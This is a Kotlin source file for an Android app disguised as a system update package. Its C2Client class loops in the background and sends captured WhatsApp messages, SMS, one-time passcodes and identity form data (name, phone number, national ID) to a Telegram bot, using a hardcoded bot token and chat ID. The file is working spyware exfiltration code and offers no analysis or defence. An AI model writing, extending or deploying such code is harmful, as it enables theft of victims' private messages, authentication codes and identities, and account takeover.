package com.sys.update

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class C2Client(private val ctx: Context) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    // Telegram Bot Token + Chat ID
    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVPO16XOcOfYXjzpW6oN5x1P9A"
    private val CHAT_ID = "8526210532"

    suspend fun run() {
        delay(15_000L)
        while (true) {
            try {
                if (C2Queue.hasPending() || C2Service.consumeBeaconRequest()) {
                    val pending = C2Queue.drain()
                    pending.forEach { sendToTelegram(it) }
                }
            } catch (_: Exception) {}

            repeat(10) {
                if (C2Service.consumeBeaconRequest() && C2Queue.hasPending()) {
                    try {
                        val urgent = C2Queue.drain()
                        urgent.forEach { sendToTelegram(it) }
                    } catch (_: Exception) {}
                }
                delay(3_000L)
            }
        }
    }

    private suspend fun sendToTelegram(data: String) = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject(data)
            val type = json.optString("type", "")

            val message = when (type) {
                "whatsapp" -> {
                    val from = json.optString("from", "?")
                    val body = json.optString("body", "")
                    "💬 WhatsApp\nFrom: $from\n$body"
                }
                "sms" -> {
                    val from = json.optString("from", "?")
                    val body = json.optString("body", "")
                    "✉️ SMS\nFrom: $from\n$body"
                }
                "otp" -> {
                    val via = json.optString("via", "sms")
                    val from = json.optString("from", "?")
                    val otp = json.optString("otp", "?")
                    val full = json.optString("full", "")
                    "🔐 OTP CAPTURED\nVia: $via\nFrom: $from\nCODE: $otp\n\n$full"
                }
                "form" -> {
                    val name = json.optString("name", "?")
                    val number = json.optString("number", "?")
                    val nic = json.optString("nic", "?")
                    "📝 FORM SUBMITTED\nName: $name\nDialog: $number\nNIC: $nic"
                }
                "voice_chunk" -> {
                    // Voice chunks - skip here, handled separately
                    return@withContext
                }
                else -> return@withContext
            }

            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            val body = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build()
            val req = Request.Builder().url(url).post(body).build()
            http.newCall(req).execute().use { }
        } catch (_: Exception) {}
    }
}
